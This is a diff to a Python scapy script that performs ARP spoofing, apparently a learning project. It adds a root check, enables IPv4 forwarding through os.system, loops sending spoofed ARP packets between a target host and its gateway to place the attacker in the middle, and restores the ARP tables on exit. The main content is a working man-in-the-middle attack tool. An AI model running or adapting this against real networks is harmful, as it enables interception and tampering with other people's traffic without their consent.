@@ -11,7 +11,23 @@ import argparse
 import time
 
 
+def check_for_sudo():
+    # Users must run this as sudo, checking to make sure they have done so
+    if os.geteuid() != 0:
+        print("Need to run as sudo.  Exiting...")
+        quit()
+
+
+def check_for_args(arguments):
+    # Validate that the user has passed both arguments
+    if arguments.target is not None and arguments.gateway is not None:
+        return True
+    else:
+        return False
+
+
 def get_arguments():
+    # Parse arguments
     parser = argparse.ArgumentParser()
     parser.add_argument("-t", "--target", dest="target", help="used for setting the target IP address")
     parser.add_argument("-g", "--gateway", dest="gateway", help="used for setting the spoofed gateway IP address")
@@ -41,20 +57,21 @@ def restore(destination_ip, source_ip):
     scapy.send(packet, verbose=False)
 
 
+def port_forwarding(flag):
+    os.system('echo ' + str(flag) + ' > /proc/sys/net/ipv4/ip_forward')
+
+
 def main():
     arguments = get_arguments()
     print(arguments)
-    if arguments.target is None or arguments.gateway is None:
-        print("You must include arguments while running this script.")
-        print("Your options are:\n\t -t/--target for the target IP address \n\t -g/--gateway for the spoofed gateway"
-              "IP address")
-        print("Please see https://docs.python.org/3/library/argparse.html for additional information")
-        quit()
-    else:
+    check_for_sudo()
+    if check_for_args(arguments):
         target = arguments.target
         gateway = arguments.gateway
         try:
+            port_forwarding(1)
             sent_packets_count = 0
+            print("\nPress Ctrl + c to exit...")
             while True:
                 spoof(target, gateway)
                 spoof(gateway, target)
@@ -62,9 +79,17 @@ def main():
                 print("\r[*] Packets Sent " + str(sent_packets_count), end="")
                 time.sleep(2)
         except KeyboardInterrupt:
-            print("\nCtrl + C pressed.............Exiting")
+            print("\nExiting...")
+            port_forwarding(0)
             restore(target, gateway)
-            #restore(gateway, target)
+            restore(gateway, target)
+            print("Complete!")
+    else:
+        print("You must include arguments while running this script.")
+        print("Your options are:\n\t -t/--target for the target IP address \n\t -g/--gateway for the spoofed gateway"
+              "IP address")
+        print("Please see https://docs.python.org/3/library/argparse.html for additional information")
+        quit()
 
 
 # This ensures that the main() function only runs automatically when this file is directly called.
